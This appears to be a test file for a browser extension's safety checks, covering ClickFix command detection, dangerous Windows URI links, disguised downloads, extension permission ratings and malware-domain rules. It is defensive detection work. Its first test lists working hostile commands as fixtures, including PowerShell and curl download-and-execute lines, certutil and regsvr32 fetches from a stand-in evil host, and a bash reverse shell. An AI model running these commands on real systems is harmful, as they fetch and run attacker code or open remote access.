/* lib/safety.js and lib/malware.js: what Outis treats as dangerous. */
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { test, assert, run } from './harness.mjs';
import { looksLikeCommand, normalizeText, dangerousLink, judgeDownload, extensionRisk, REASONS, EXECUTABLE, SCRIPT } from '../lib/safety.js';
import { MALWARE, malwareRules, malwareOfHost, malwareKeyOfUrl } from '../lib/malware.js';
import { CATEGORIES, SUBRESOURCE_TYPES } from '../lib/trackers.js';
import { dynamicRules, RULE, LOCAL_HTTP, LOCAL_DOMAINS } from '../lib/rules.js';
import { normalize, shieldFiles, shieldNeeded } from '../lib/settings.js';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

test('commands that download or run code are recognized (ClickFix and pastejacking payloads)', () => {
  const bad = [
    'powershell -w hidden -c "iwr https://evil.test/a.ps1 -UseBasicParsing | iex"',
    'cmd /c start /min powershell -nop -ep bypass -c "irm evil.test/x | iex"',
    'mshta https://evil.test/verify.hta # ✅ I am not a robot - reCAPTCHA Verification ID: 2165',
    'conhost --headless powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
    '/bin/bash -c "$(curl -fsSL https://evil.test/install.sh)"',
    'echo "Y3VybCBodHRwOi8vZXZpbA==" | base64 -d | bash',
    'curl -s http://evil.test/a | sh',
    'wget -qO- http://evil.test/x | sudo bash',
    'msiexec /i https://evil.test/x.msi /qn',
    'rundll32 \\\\evil.test\\share\\x.dll,Start',
    'osascript -e \'do shell script "curl -s http://x | sh"\'',
    'pwsh -c "irm evil.test/x | iex"',
    'certutil -urlcache -split -f http://evil.test/x.exe %TEMP%\\x.exe',
    'explorer.exe "\\\\evil.test@SSL\\DavWWWRoot\\doc.lnk"',
    'cmd.exe /k "start https://evil.test"',
    'python3 -c "import os;os.system(\'id\')"',
    'regsvr32 /s /n /u /i:http://evil.test/x.sct scrobj.dll',
    'bitsadmin /transfer j http://evil.test/x.exe C:\\x.exe',
    'iex (New-Object Net.WebClient).DownloadString("http://evil.test/a")',
    'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'
  ];
  for (const c of bad) assert.ok(looksLikeCommand(c), c);
});

test('ordinary text and everyday developer commands are not', () => {
  const fine = [
    'npm install react', 'git clone https://github.com/user/repo.git', 'pip install requests', 'docker run -it ubuntu bash',
    'ls -la', 'I use PowerShell at work every day.', 'The cmd key is next to the space bar.', 'brew install wget',
    'Invoice #4471, due 2026-12-01', 'https://example.com/page?id=7', 'SELECT * FROM users WHERE id = 1;',
    'Shipping to 1 Main St, Springfield', 'cd ~/projects && make', 'yarn add lodash'
  ];
  for (const c of fine) assert.ok(!looksLikeCommand(c), c);
  assert.ok(!looksLikeCommand(''));
  assert.ok(!looksLikeCommand('x'.repeat(30000)));
  assert.equal(normalizeText('  curl\u200b -s \n\t x  '), 'curl -s x');
});

test('links that open Windows tools are dangerous; Office links only to Microsoft services are fine', () => {
  assert.equal(dangerousLink('search-ms:query=invoice&crumb=location:\\\\evil.test\\share'), 'search-ms');
  assert.equal(dangerousLink('  SEARCH-MS:query=x'), 'search-ms');
  assert.equal(dangerousLink('ms-msdt:/id PCWDiagnostic /skip force'), 'ms-msdt');
  assert.equal(dangerousLink('ms-appinstaller:?source=https://evil.test/app.msix'), 'ms-appinstaller');
  assert.equal(dangerousLink('ms-word:ofe|u|https://evil.test/doc.docx'), 'ms-word');
  assert.equal(dangerousLink('ms-word:ofe|u|https://contoso.sharepoint.com/sites/x/doc.docx'), '');
  assert.equal(dangerousLink('ms-excel:ofv|u|https://onedrive.live.com/x.xlsx'), '');
  assert.equal(dangerousLink('ms-excel:ofv|u|https://sharepoint.com.evil.test/x.xlsx'), 'ms-excel');
  for (const ok of ['https://example.com/', 'mailto:me@example.com', 'tel:+15551234', '/relative/path', '#top', 'javascript:void(0)', 'zoommtg://zoom.us/join', 'ms-settings:privacy', '']) assert.equal(dangerousLink(ok), '', ok);
});

test('downloads: disguised, page-built, fake updates and click-to-run scripts are stopped; ordinary files are not', () => {
  const j = d => judgeDownload(d);
  assert.deepEqual(j({ filename: '/home/me/Downloads/invoice.pdf.exe', url: 'https://shop.test/invoice.pdf.exe' }).reasons, ['disguised']);
  assert.deepEqual(j({ filename: 'photo.jpg        .scr', url: 'https://x.test/a' }).reasons, ['disguised', 'script']);
  assert.ok(j({ filename: 'invoice\u202Efdp.exe', url: 'https://x.test/a' }).reasons.includes('disguised'));
  assert.deepEqual(j({ filename: 'setup.exe', url: 'blob:https://evil.test/1b2c' }).reasons, ['assembled']);
  assert.deepEqual(j({ filename: 'tool.iso', url: 'data:application/octet-stream;base64,AAAA' }).reasons, ['assembled']);
  assert.deepEqual(j({ filename: 'Chrome-Update.zip', url: 'https://compromised.test/update.zip' }).reasons, ['fakeUpdate']);
  assert.ok(j({ filename: 'Update.Firefox.js', url: 'https://x.test/u.js' }).reasons.includes('fakeUpdate'));
  assert.equal(j({ filename: 'chrome_updater.exe', url: 'https://dl.google.com/chrome/install/chrome_updater.exe' }).block, false);
  assert.deepEqual(j({ filename: 'report.js', url: 'https://x.test/report.js' }).reasons, ['script']);
  assert.deepEqual(j({ filename: 'Shortcut.lnk', url: 'https://x.test/a' }).reasons, ['script']);
  for (const ok of [
    { filename: 'setup.exe', url: 'https://vendor.test/setup.exe' },
    { filename: 'notes.txt', url: 'blob:https://app.test/abc' },
    { filename: 'export.zip', url: 'blob:https://app.test/abc' },
    { filename: 'design.svg', url: 'blob:https://figma.test/abc' },
    { filename: 'report.pdf', url: 'https://bank.test/r.pdf' },
    { filename: 'photo.2026.jpg', url: 'https://x.test/p.jpg' },
    { filename: 'archive.tar.gz', url: 'https://x.test/a.tar.gz' },
    { filename: 'ubuntu-24.04.iso', url: 'https://releases.ubuntu.test/ubuntu.iso' }
  ]) assert.equal(j(ok).block, false, ok.filename);
  for (const r of Object.keys(REASONS)) assert.ok(REASONS[r].length > 20);
  for (const x of SCRIPT) assert.ok(EXECUTABLE.has(x), 'every script type is executable: ' + x);
});

test('other extensions: what they are able to do decides the rating', () => {
  assert.equal(extensionRisk({ hostPermissions: ['<all_urls>'], permissions: ['scripting', 'storage'], installType: 'normal' }).level, 'high');
  assert.equal(extensionRisk({ hostPermissions: ['*://*/*'], permissions: ['storage'], installType: 'normal' }).level, 'medium');
  assert.equal(extensionRisk({ hostPermissions: [], permissions: ['storage'], installType: 'normal' }).level, 'low');
  assert.equal(extensionRisk({ hostPermissions: [], permissions: [], installType: 'sideload' }).level, 'high');
  assert.equal(extensionRisk({ hostPermissions: ['https://mail.example.com/*'], permissions: ['history'], installType: 'normal' }).level, 'medium');
  const r = extensionRisk({ hostPermissions: ['<all_urls>'], permissions: ['nativeMessaging', 'cookies'], installType: 'development' });
  assert.ok(r.reasons.some(x => /every site/.test(x)) && r.reasons.some(x => /programs on your computer/.test(x)) && r.reasons.some(x => /unpacked/.test(x)));
});

test('malware list: valid, unique, separate from the tracker list, and what each block covers', () => {
  const hostname = /^(?=.{1,253}$)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z][a-z0-9-]*[a-z0-9]$/;
  const seen = new Set();
  for (const c of MALWARE) for (const d of c.domains) { assert.match(d, hostname, d); assert.ok(!seen.has(d), d); seen.add(d); }
  for (const c of CATEGORIES) for (const d of c.domains) assert.ok(!seen.has(d), 'on both lists: ' + d);
  for (const d of ['github.com', 'cloudflare.com', 'workers.dev', 'pages.dev', 'google.com']) assert.ok(!seen.has(d), d);
  const rules = malwareRules();
  const ids = new Set(rules.map(r => r.id));
  assert.equal(ids.size, rules.length);
  const page = rules.filter(r => r.condition.resourceTypes.includes('main_frame'));
  assert.ok(page.every(r => r.action.type === 'redirect' && r.action.redirect.extensionPath === '/blocked.html'), 'opening a listed site shows the warning page');
  const tunnels = rules.find(r => r.id === 1301);
  assert.equal(tunnels.condition.domainType, 'thirdParty', 'tunnels are only blocked inside other sites');
  assert.ok(!rules.some(r => r.id === 1300), 'and can still be opened directly');
  assert.ok(rules.every(r => r.priority === 2), 'outranks HTTPS upgrades and tracker rules, not the paused-site rule');
  assert.equal(malwareOfHost('www.coinhive.com').key, 'miners');
  assert.equal(malwareKeyOfUrl('https://a.b.trycloudflare.com/x.js'), 'tunnels');
  assert.equal(malwareKeyOfUrl('https://example.com/'), null);
  assert.ok(fs.existsSync(path.join(ROOT, 'blocked.html')));
});

test('HTTPS: pages and frames are upgraded, your own network is not', () => {
  const r = dynamicRules(normalize({}));
  const up = r.find(x => x.id === RULE.HTTPS);
  assert.equal(up.action.type, 'upgradeScheme');
  assert.deepEqual(up.condition.resourceTypes, ['main_frame', 'sub_frame']);
  const re = new RegExp(LOCAL_HTTP);
  for (const u of ['http://127.0.0.1/', 'http://192.168.1.1:8080/admin', 'http://10.0.0.1', 'http://172.20.0.5/', 'http://169.254.1.1/', 'http://router/', 'http://[::1]:3000/', 'http://nas:5000/']) assert.ok(re.test(u), u);
  for (const u of ['http://example.com/', 'http://172.32.0.1/', 'http://user@example.com/', 'http://8.8.8.8/', 'http://192.168.1.1.evil.test/']) assert.ok(!re.test(u), u);
  assert.ok(LOCAL_DOMAINS.includes('localhost') && LOCAL_DOMAINS.includes('local') && LOCAL_DOMAINS.includes('home.arpa'));
  assert.ok(!dynamicRules(normalize({ https: false })).some(x => x.id === RULE.HTTPS));
});

test('settings: safety defaults on (WebAssembly blocking opt-in), trusted sites get their own shield files', () => {
  const s = normalize({});
  for (const k of ['https', 'malware', 'safeBrowsing', 'downloads', 'clipboard', 'appLinks', 'notifications', 'harden']) assert.equal(s[k], true, k);
  assert.equal(s.wasm, false);
  assert.deepEqual(shieldFiles(s, true), ['inject/opt/trusted.js', 'inject/places/nowhere.js', 'inject/shield.js']);
  assert.ok(shieldFiles(normalize({ clipboard: false, appLinks: false, harden: false, wasm: true })).join().includes('no-clipboard.js,inject/opt/no-applinks.js,inject/opt/no-harden.js,inject/opt/wasm-off.js'));
  assert.equal(shieldNeeded(normalize({ canvas: false, audio: false, device: false, screen: false, timezone: false, language: false, referrer: false, activity: false, gpc: false, location: 'off' })), true, 'the safety modules still run');
});

test('the shield carries the same safety patterns as lib/safety.js', () => {
  const src = fs.readFileSync(path.join(ROOT, 'inject', 'shield.js'), 'utf8');
  const m = /\/\*@safety\*\/const SAFETY = (\{.*\});\/\*@end\*\//.exec(src);
  assert.ok(m);
  const s = JSON.parse(m[1]);
  assert.ok(s.commands.length > 10 && s.schemes.includes('search-ms') && s.office.includes('ms-word') && s.microsoft.includes('sharepoint.com'));
});

process.exit(await run('safety') ? 1 : 0);
